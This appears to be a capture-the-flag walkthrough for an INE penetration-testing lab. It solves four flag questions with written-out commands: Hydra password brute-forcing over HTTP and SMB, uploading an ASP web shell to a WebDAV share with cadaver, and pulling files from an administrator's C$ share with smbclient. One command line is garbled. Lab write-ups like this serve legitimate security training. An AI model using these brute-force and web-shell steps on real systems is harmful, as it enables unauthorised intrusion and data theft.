# Host & Network Penetration Testing: System-Host Based Attacks

## Questions and Resolutions

### Q1. User ‘bob’ might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)

**Resolution:**  
- Perform a reconnaissance scan with Nmap:
```bash
nmap -sC -sV target1.ine.local
```
- Notice port 80 is open with a 401 Unauthorized status.
- Brute-force the password for user `bob` using Hydra:
```bash
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get
```
- Log in and perform directory fuzzing with Dirb:
```bash
dirb http://target1.ine.local -u bob:<password>
```
- Discover and navigate to `/webdav` for the target.

### Q2. Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)

**Resolution:**  
- Discover `.asp` file upload possibility (e.g., `test.asp`).
- Enumerate file upload extensions with davtest:
```bash
davtest -auth bob:<password> -url http://target1.ine.local/webdav
```
- Upload a shell using cadaver:
```bash
cadaver http://target1.ine.local/webdav
put /usr/share/webshells/asp/webshell.asp
```
- Use the shell to access the C: drive and list contents:
```bash
dir C:type C:lag2.txt
```
- Alternatively, use the Metasploit module `windows/iis/iis_upload_webdav_upload_asp`.

### Q3. By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)

**Resolution:**  
- Scan with Nmap for open SMB port (445).
- Gather info with enum4linux (may be blocked).
- Brute-force user and password using Hydra:
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local
```
- Access the SMB share for administrator:
```bash
smbclient -L //target2.ine.local -U administrator
```
- Check share permissions with crackmapexec:
```bash
crackmapexec smb target2.ine.local -u administrator -p <password> --shares
```
- Connect to C$ and download flag:
```bash
smbclient //target2.ine.local/C$ -U administrator
dir
get flag3.txt
```

### Q4. The Desktop directory might have what you’re looking for. Enumerate its contents. (target2.ine.local)

**Resolution:**  
- Navigate to the Administrator's Desktop:
```bash
cd Users\Administrator\Desktop
dir
get flag4.txt
```
- Read the flag file locally with `cat`.
